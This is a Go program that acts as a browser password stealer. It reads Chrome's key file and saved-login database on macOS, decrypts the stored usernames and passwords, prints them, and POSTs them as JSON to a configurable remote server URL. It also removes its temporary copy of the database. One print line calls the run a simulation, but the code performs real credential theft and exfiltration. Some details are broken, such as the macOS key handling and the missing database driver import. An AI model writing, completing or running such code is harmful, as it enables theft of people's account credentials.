package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"
)

const (
	CHROME_PATH  = "~/Library/Application Support/Google/Chrome/Default/Login Data"
	TEMP_DB_PATH = "temp_login_data.db"
	SERVER_URL   = "PUT_SERVER_URL_HERE"
)

type Credential struct {
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Timestamp string `json:"timestamp"`
}

func getMasterKey() ([]byte, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %v", err)
	}

	localStatePath := filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, fmt.Errorf("failed to parse Local State: %v", err)
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey[5:])
	if err != nil {
		return nil, fmt.Errorf("failed to decode encrypted key: %v", err)
	}

	// On macOS, Chrome uses the Keychain to store the master key
	// The encrypted key is already decrypted by the system
	return encryptedKey, nil
}

func findLoginData() error {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}
	chromePath := filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data")

	source, err := os.Open(chromePath)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(TEMP_DB_PATH)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	if err != nil {
		return err
	}

	return nil
}

func decryptPassword(encryptedPassword []byte, masterKey []byte) (string, error) {
	if len(encryptedPassword) < 3 {
		return "", fmt.Errorf("encrypted password too short")
	}

	if string(encryptedPassword[:3]) == "v10" {
		encryptedPassword = encryptedPassword[3:]
	}

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	iv := encryptedPassword[:12]
	ciphertext := encryptedPassword[12:]

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %v", err)
	}

	return string(plaintext), nil
}

func stealPasswords() ([]Credential, error) {
	masterKey, err := getMasterKey()
	if err != nil {
		return nil, fmt.Errorf("failed to get master key: %v", err)
	}

	if err := findLoginData(); err != nil {
		return nil, err
	}
	defer os.Remove(TEMP_DB_PATH)

	db, err := sql.Open("sqlite3", TEMP_DB_PATH)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("failed to query logins: %v", err)
	}
	defer rows.Close()

	var credentials []Credential
	for rows.Next() {
		var originURL, username string
		var encryptedPassword []byte
		if err := rows.Scan(&originURL, &username, &encryptedPassword); err != nil {
			continue
		}

		password, err := decryptPassword(encryptedPassword, masterKey)
		if err != nil {
			continue
		}

		credential := Credential{
			URL:       originURL,
			Username:  username,
			Password:  password,
			Timestamp: time.Now().Format(time.RFC3339),
		}
		credentials = append(credentials, credential)
		fmt.Printf("Stolen: %s @ %s - %s\n", username, originURL, password)
	}
	return credentials, nil
}

func sendToServer(credentials []Credential) error {
	jsonData, err := json.Marshal(credentials)
	if err != nil {
		return fmt.Errorf("failed to marshal credentials: %v", err)
	}

	resp, err := http.Post(SERVER_URL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send to server: %v", err)
	}
	defer resp.Body.Close()

	return nil
}

func cleanup() {
	if _, err := os.Stat(TEMP_DB_PATH); err == nil {
		os.Remove(TEMP_DB_PATH)
	}
}

func main() {
	defer cleanup()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		cleanup()
		os.Exit(0)
	}()

	fmt.Printf("Simulating password steal for user: %s\n", os.Getenv("USERNAME"))
	credentials, err := stealPasswords()
	if err != nil {
		log.Printf("Error stealing passwords: %v", err)
		return
	}
	if len(credentials) > 0 {
		fmt.Println("Passwords stolen: ", credentials)
		sendToServer(credentials)
	} else {
		log.Println("No passwords stolen or error occurred.")
	}
}
